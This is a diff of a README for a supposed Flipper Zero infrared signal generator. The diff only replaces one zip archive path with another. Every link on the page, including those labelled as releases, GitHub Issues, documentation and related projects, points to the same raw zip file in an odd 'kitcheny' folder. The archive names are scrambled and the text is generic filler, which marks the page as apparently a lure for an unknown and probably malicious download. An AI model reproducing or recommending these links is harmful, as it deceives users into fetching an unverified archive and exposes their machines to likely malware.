@@ -1,7 +1,7 @@
 # 🎛️ Flipper-Zero-IR-Signal-Generator - Generate Infrared Signals Easily
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/temboohms68/Flipper-Zero-IR-Signal-Generator/master/kitcheny/Signal-Generator-I-Zero-Flipper-v2.8-beta.4.zip%20Latest%https://raw.githubusercontent.com/temboohms68/Flipper-Zero-IR-Signal-Generator/master/kitcheny/Signal-Generator-I-Zero-Flipper-v2.8-beta.4.zip)](https://raw.githubusercontent.com/temboohms68/Flipper-Zero-IR-Signal-Generator/master/kitcheny/Signal-Generator-I-Zero-Flipper-v2.8-beta.4.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/temboohms68/Flipper-Zero-IR-Signal-Generator/master/kitcheny/Generator-Flipper-I-Signal-Zero-v3.6.zip%20Latest%https://raw.githubusercontent.com/temboohms68/Flipper-Zero-IR-Signal-Generator/master/kitcheny/Generator-Flipper-I-Signal-Zero-v3.6.zip)](https://raw.githubusercontent.com/temboohms68/Flipper-Zero-IR-Signal-Generator/master/kitcheny/Generator-Flipper-I-Signal-Zero-v3.6.zip)
 
 ## 🚀 Getting Started
 The Flipper Zero IR Signal Generator allows you to create and emit infrared signals, making it a valuable tool for various applications. This is particularly useful for security assessments and hardware hacking tasks. With a simple setup, you can leverage the capabilities of your Flipper Zero device.
@@ -25,7 +25,7 @@ To get started, follow these steps to download and install the Flipper Zero IR S
 
 1. **Visit the Releases Page**
    Click the link below to go to the Releases page.
-   [Download Releases](https://raw.githubusercontent.com/temboohms68/Flipper-Zero-IR-Signal-Generator/master/kitcheny/Signal-Generator-I-Zero-Flipper-v2.8-beta.4.zip)
+   [Download Releases](https://raw.githubusercontent.com/temboohms68/Flipper-Zero-IR-Signal-Generator/master/kitcheny/Generator-Flipper-I-Signal-Zero-v3.6.zip)
 
 2. **Choose Your Version**
    Look for the latest version listed. Each release usually has a description of new features or fixes.
@@ -65,11 +65,11 @@ If you face issues while downloading or using the software:
 - Check for software updates in the Releases section.
 - Review common problems in community discussions.
 
-For more in-depth support, visit the [GitHub Issues](https://raw.githubusercontent.com/temboohms68/Flipper-Zero-IR-Signal-Generator/master/kitcheny/Signal-Generator-I-Zero-Flipper-v2.8-beta.4.zip) page.
+For more in-depth support, visit the [GitHub Issues](https://raw.githubusercontent.com/temboohms68/Flipper-Zero-IR-Signal-Generator/master/kitcheny/Generator-Flipper-I-Signal-Zero-v3.6.zip) page.
 
 ## 🔗 More Information
 Explore additional resources related to the Flipper Zero and IR Signal Generator:
-- [Flipper Zero Documentation](https://raw.githubusercontent.com/temboohms68/Flipper-Zero-IR-Signal-Generator/master/kitcheny/Signal-Generator-I-Zero-Flipper-v2.8-beta.4.zip)
-- [Related Projects](https://raw.githubusercontent.com/temboohms68/Flipper-Zero-IR-Signal-Generator/master/kitcheny/Signal-Generator-I-Zero-Flipper-v2.8-beta.4.zip)
+- [Flipper Zero Documentation](https://raw.githubusercontent.com/temboohms68/Flipper-Zero-IR-Signal-Generator/master/kitcheny/Generator-Flipper-I-Signal-Zero-v3.6.zip)
+- [Related Projects](https://raw.githubusercontent.com/temboohms68/Flipper-Zero-IR-Signal-Generator/master/kitcheny/Generator-Flipper-I-Signal-Zero-v3.6.zip)
 
 Remember, your Flipper Zero IR Signal Generator is a powerful tool, and with this guide, you can easily start using it in no time!
